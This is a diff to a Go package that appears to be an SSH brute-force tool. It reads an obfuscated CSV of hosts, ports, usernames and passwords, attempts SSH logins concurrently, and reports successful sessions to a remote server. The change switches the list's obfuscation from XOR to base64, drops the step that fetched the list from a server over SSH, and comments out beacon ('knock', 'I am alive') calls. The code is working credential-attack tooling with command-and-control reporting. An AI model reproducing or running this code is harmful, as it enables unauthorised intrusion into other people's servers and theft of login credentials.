@@ -2,6 +2,7 @@ package bf
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/csv"
 	"flag"
 	"fmt"
@@ -14,7 +15,7 @@ import (
 	"sort"
 	"strconv"
 	"sync"
-	knock "test/KNOCK"
+	check "test/CHECK"
 	vars "test/VARS"
 	"time"
 
@@ -33,20 +34,19 @@ func Bf(conf vars.Config) {
 
 	flag.Parse()
 
-	if conf.Flags.BrFile == "" || conf.Server.Host == "" || conf.Server.Port == "" || conf.Server.User == "" || conf.Server.Pass == "" {
+	if conf.Flags.BrFile == "" || conf.Client.Host == "" || conf.Client.Port == "" || conf.Client.User == "" || conf.Client.Pass == "" {
 		return
 	}
 
 	vars.BrFileHomeDir = filepath.Join("/tmp", RandomString(10))
-	serCon.Host = conf.Server.Host
-	serCon.Port = conf.Server.Port
-	serCon.Username = conf.Server.User // []Do Something TODO
-	serCon.Password = conf.Server.Pass
+	serCon.Host = conf.Client.Host
+	serCon.Port = conf.Client.Port
+	serCon.Username = conf.Client.User // []Do Something TODO
+	serCon.Password = conf.Client.Pass
 
 	msgSess := make(chan vars.Connection)
 	msgErr := make(chan vars.Connection)
 	go checkSession(msgSess, msgErr)
-	GetFileFromServer(conf.Flags.BrFile)
 	ReadCsv(msgSess, msgErr, conf)
 }
 
@@ -72,22 +72,30 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 
 }
 
-func ReadCsv(msgSess, msgErr chan vars.Connection, conf vars.Config) {
-
-	file, err := os.ReadFile(vars.BrFileHomeDir)
+func ReadBfFile() ([][]string, error) {
+	x := check.OpenAndReadFiles("test.csv")
+	fmt.Println()
+	decodedBytes, err := base64.StdEncoding.DecodeString(string(x))
 	if err != nil {
-		fmt.Println(err)
+		fmt.Println("Error decoding base64 BF file:", err)
+		return [][]string{}, err
 	}
-	for i, j := range file {
-		file[i] = j ^ 'P'
-	}
-	byteReader := bytes.NewReader(file)
+	fmt.Println(string(decodedBytes))
+	byteReader := bytes.NewReader(decodedBytes)
 	reader := csv.NewReader(byteReader)
 	records, err := reader.ReadAll()
 	if err != nil {
-		fmt.Println("Error reading records")
+		fmt.Println("Error reading records:", err)
+		return [][]string{}, err
 	}
+	return records, nil
 
+}
+
+func ReadCsv(msgSess, msgErr chan vars.Connection, conf vars.Config) {
+
+	records, err := ReadBfFile()
+	check.Check("Read Csv Error", err)
 	Ports := []string{}
 	Hosts := []string{}
 	Users := []string{}
@@ -176,14 +184,6 @@ func SendFileToServer(finalSessionsFound []vars.Connection, conf vars.Config) {
 		stringToWrite = stringToWrite + x
 
 	}
-
-	// fmt.Println(stringToWrite, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
-	// runCommand := fmt.Sprintf("%s  -e \"%s\" >> response.txt", "echo", stringToWrite)
-
-	// erra := session.Run(runCommand)
-	// if erra != nil {
-	// fmt.Println("error")
-	// }
 	b.Reset()
 }
 
@@ -203,7 +203,7 @@ func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Con
 					} else if session != nil {
 						msgSess <- conn
 						session.Close()
-						knock.SendKnock(conn.Place, conf)
+						// knock.SendKnock(conn.Place, conf) //
 					}
 				}
 			}()
@@ -212,8 +212,8 @@ func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Con
 		wg.Wait()
 		fmt.Println("END NEXT 3")
 		// knock.SendKnock("")
-		delay := 500 * time.Millisecond
-		knock.SendIAmAlive(conf.Server.Host, conf.Flags.KnockAlive, delay)
+		// delay := 500 * time.Millisecond
+		// knock.SendIAmAlive(conf.Client.Host, conf.Flags.KnockAlive, delay)
 		ClearList(allConn)
 	}
 	// return foundSessions
@@ -268,34 +268,6 @@ func CreateConn(c vars.Connection) (*ssh.Session, vars.Connection, error) {
 		return nil, c, err
 	}
 	return session, c, nil
-}
-
-func GetFileFromServer(BrFile string) {
-	fmt.Println(serCon, "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
-	session, _, err := CreateConn(serCon)
-	if err != nil {
-		fmt.Println("error")
-	}
-
-	fmt.Println(b, "AAAAAAAAAAAAAAAAAA", session)
-	session.Stdout = &b
-	erra := session.Run("cat " + BrFile)
-	if erra != nil {
-		fmt.Println("error", erra)
-	}
-	WriteFile(b)
-	b.Reset()
-
-}
-
-func WriteFile(b bytes.Buffer) {
-	for i, j := range b.Bytes() {
-		b.Bytes()[i] = j ^ 'P'
-	}
-	err := os.WriteFile(vars.BrFileHomeDir, b.Bytes(), 0777)
-	if err != nil {
-		fmt.Println(err)
-	}
 }
 
 func removeDuplicates(nums []int) []int {
